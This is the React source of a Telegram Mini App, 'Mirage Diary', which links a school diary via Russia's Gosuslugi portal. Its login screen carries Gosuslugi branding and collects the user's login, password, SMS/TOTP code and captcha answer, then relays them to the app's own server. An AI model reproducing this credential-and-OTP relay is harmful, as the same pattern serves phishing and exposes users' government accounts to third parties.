import { useState, useEffect } from 'react';
import { Shield, CheckCircle2, AlertCircle, ChevronRight, RefreshCw, Lock, Phone } from 'lucide-react';

const SERVER_URL = import.meta.env.VITE_SERVER_URL || 'http://localhost:5000';

type Step = 'welcome' | 'login' | 'polling' | 'otp' | 'captcha' | 'success' | 'error';

export default function App() {
  const [step, setStep] = useState<Step>('welcome');
  const [tgUserId, setTgUserId] = useState('');
  const [tgFirstName, setTgFirstName] = useState('');

  const [login, setLogin] = useState('');
  const [password, setPassword] = useState('');
  
  const [sessionId, setSessionId] = useState('');
  const [userInput, setUserInput] = useState('');
  const [captchaImg, setCaptchaImg] = useState('');
  const [errorMsg, setErrorMsg] = useState('');

  useEffect(() => {
    try {
      const tg = (window as any).Telegram?.WebApp;
      if (tg) {
        tg.ready();
        tg.expand();
        const user = tg.initDataUnsafe?.user;
        if (user?.id) setTgUserId(String(user.id));
        if (user?.first_name) setTgFirstName(user.first_name);
      } else {
        setTgUserId('123456789');
        setTgFirstName('Тест');
      }
    } catch { setTgUserId('123456789'); setTgFirstName('Тест'); }
  }, []);

  // Poll for auth status
  useEffect(() => {
    if (step !== 'polling' || !sessionId) return;
    
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`${SERVER_URL}/api/miniapp/auth/status/${sessionId}`);
        if (res.ok) {
          const data = await res.json();
          if (data.status === 'Success') {
            clearInterval(interval);
            setStep('success');
            setTimeout(() => (window as any).Telegram?.WebApp?.close?.(), 3000);
          } else if (data.status === 'RequiresOtp') {
            clearInterval(interval);
            setUserInput('');
            setStep('otp');
          } else if (data.status === 'RequiresCaptcha') {
            clearInterval(interval);
            setCaptchaImg(data.captchaImage);
            setUserInput('');
            setStep('captcha');
          } else if (data.status === 'Failed' || data.status === 'Expired') {
            clearInterval(interval);
            setErrorMsg(data.errorMessage || 'Сессия истекла или произошла ошибка');
            setStep('error');
          }
        }
      } catch { /* ignore poll errors */ }
    }, 2000);
    return () => clearInterval(interval);
  }, [step, sessionId]);

  const handleStartAuth = async () => {
    if (!login || !password) return;
    setStep('polling');
    setErrorMsg('');
    try {
      const res = await fetch(`${SERVER_URL}/api/miniapp/auth/start`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ TelegramUserId: tgUserId, Login: login, Password: password }),
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data = await res.json();
      setSessionId(data.sessionId);
    } catch (e: any) {
      setErrorMsg('Ошибка связи с сервером. ' + e.message);
      setStep('error');
    }
  };

  const handleSubmitInput = async () => {
    if (!userInput) return;
    setStep('polling');
    try {
      const res = await fetch(`${SERVER_URL}/api/miniapp/auth/submit-input`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ SessionId: sessionId, Input: userInput }),
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
    } catch (e: any) {
      setErrorMsg('Ошибка отправки кода. ' + e.message);
      setStep('error');
    }
  };

  // ─── WELCOME ─────────────────────────────────────────────────────────────
  if (step === 'welcome') return (
    <div className="screen">
      <div className="logo-wrap">
        <div className="logo-circle"><Shield size={38} className="logo-icon" /></div>
        <h1 className="app-title">Mirage Diary</h1>
        <p className="app-sub">
          {tgFirstName ? `Привет, ${tgFirstName}! ` : ''}
          Подключите дневник через Госуслуги.
        </p>
      </div>

      <div className="steps-card">
        <div className="step-row"><span className="step-badge">1</span><span>Введите логин и пароль от Госуслуг</span></div>
        <div className="step-row"><span className="step-badge">2</span><span>Мы безопасно получим токен дневника</span></div>
        <div className="step-row"><span className="step-badge">3</span><span>Пароль нигде не сохраняется</span></div>
      </div>

      <button className="btn-primary" onClick={() => setStep('login')}>
        Продолжить <ChevronRight size={18} />
      </button>
    </div>
  );

  // ─── LOGIN ─────────────────────────────────────────────────────────────
  if (step === 'login') return (
    <div className="screen">
      <div className="logo-wrap">
        <div className="logo-circle logo-circle--amber"><Lock size={32} className="logo-icon" /></div>
        <h1 className="app-title">Госуслуги</h1>
        <p className="app-sub">Введите данные для входа</p>
      </div>

      <div className="input-group">
        <label className="input-label">Телефон, Email или СНИЛС</label>
        <input 
          type="text" 
          className="text-input" 
          value={login} 
          onChange={(e) => setLogin(e.target.value)} 
          placeholder="Например, +7 (999) 000-00-00" 
        />
      </div>

      <div className="input-group mt-4">
        <label className="input-label">Пароль</label>
        <input 
          type="password" 
          className="text-input" 
          value={password} 
          onChange={(e) => setPassword(e.target.value)} 
          placeholder="••••••••" 
        />
      </div>

      <button className="btn-primary mt-6" onClick={handleStartAuth} disabled={!login || !password}>
        Войти
      </button>
      <button className="btn-ghost mt-2" onClick={() => setStep('welcome')}>Отмена</button>
    </div>
  );

  // ─── OTP / 2FA ─────────────────────────────────────────────────────────────
  if (step === 'otp') return (
    <div className="screen">
      <div className="logo-wrap">
        <div className="logo-circle logo-circle--amber"><Phone size={32} className="logo-icon" /></div>
        <h1 className="app-title">Проверка безопасности</h1>
        <p className="app-sub">Введите код из СМС или TOTP приложения</p>
      </div>

      <div className="input-group mt-4">
        <input 
          type="text" 
          className="text-input text-center text-lg" 
          value={userInput} 
          onChange={(e) => setUserInput(e.target.value)} 
          placeholder="000000" 
          maxLength={6}
          autoFocus
        />
      </div>

      <button className="btn-primary mt-6" onClick={handleSubmitInput} disabled={userInput.length < 4}>
        Подтвердить
      </button>
    </div>
  );

  // ─── CAPTCHA ─────────────────────────────────────────────────────────────
  if (step === 'captcha') return (
    <div className="screen">
      <div className="logo-wrap">
        <div className="logo-circle logo-circle--amber"><Shield size={32} className="logo-icon" /></div>
        <h1 className="app-title">Защита от роботов</h1>
        <p className="app-sub">Введите текст с картинки</p>
      </div>

      <div className="captcha-container mt-4">
        {captchaImg && <img src={`data:image/jpeg;base64,${captchaImg}`} alt="Captcha" className="captcha-img" />}
      </div>

      <div className="input-group mt-4">
        <input 
          type="text" 
          className="text-input text-center text-lg" 
          value={userInput} 
          onChange={(e) => setUserInput(e.target.value)} 
          placeholder="Текст с картинки" 
          autoFocus
        />
      </div>

      <button className="btn-primary mt-6" onClick={handleSubmitInput} disabled={!userInput}>
        Продолжить
      </button>
    </div>
  );

  // ─── POLLING (LOADING) ───────────────────────────────────────────────────
  if (step === 'polling') return (
    <div className="screen screen-center">
      <div className="spinner-wrap">
        <div className="spinner-ring" />
      </div>
      <p className="sync-title">Связываюсь с Госуслугами...</p>
      <p className="sync-sub mt-2">Пожалуйста, подождите. Это может занять до 30 секунд.</p>
    </div>
  );

  // ─── SUCCESS ─────────────────────────────────────────────────────────────
  if (step === 'success') return (
    <div className="screen screen-center">
      <div className="success-circle">
        <CheckCircle2 size={52} className="success-icon" />
      </div>
      <h2 className="success-title">Успешно!</h2>
      <p className="success-sub mt-2">Вы вошли в систему. Окно закроется автоматически.</p>
    </div>
  );

  // ─── ERROR ───────────────────────────────────────────────────────────────
  if (step === 'error') return (
    <div className="screen screen-center">
      <div className="error-circle">
        <AlertCircle size={52} className="error-icon" />
      </div>
      <h2 className="error-title">Ошибка входа</h2>
      <p className="error-sub mt-2">{errorMsg}</p>
      <button className="btn-primary mt-6" onClick={() => setStep('login')}>
        <RefreshCw size={16} /> Попробовать снова
      </button>
    </div>
  );

  return null;
}
